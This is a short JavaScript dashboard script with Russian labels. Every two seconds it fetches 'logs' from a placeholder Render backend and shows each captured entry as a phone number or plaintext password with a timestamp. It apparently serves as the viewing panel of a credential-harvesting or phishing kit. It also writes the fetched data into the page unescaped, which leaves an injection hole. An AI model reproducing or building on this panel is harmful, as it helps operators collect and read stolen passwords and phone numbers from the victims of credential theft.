const API = "https://YOUR-RENDER-URL.onrender.com";

function fetchLogs() {
  fetch(API + "/api/logs")
    .then(res => res.json())
    .then(showLogs);
}
function showLogs(data) {
  const list = document.getElementById("log-list");
  list.innerHTML = "";
  data.forEach(item=>{
    const div=document.createElement("div");
    div.className="log-item";
    div.innerHTML=`<b>${item.type==="phone"?"Телефон":"Пароль"}</b><br><small>${item.time}</small>`;
    div.onclick=()=>showDetails(item);
    list.appendChild(div);
  });
}

function showDetails(item){
  document.getElementById("details-box").innerHTML=
  `<p><b>Тип:</b> ${item.type}</p>
   <p><b>Данные:</b> ${item.type==="phone"?item.phone:item.password}</p>
   <p><b>Время:</b> ${item.time}</p>`;
}

setInterval(fetchLogs,2000);
fetchLogs();
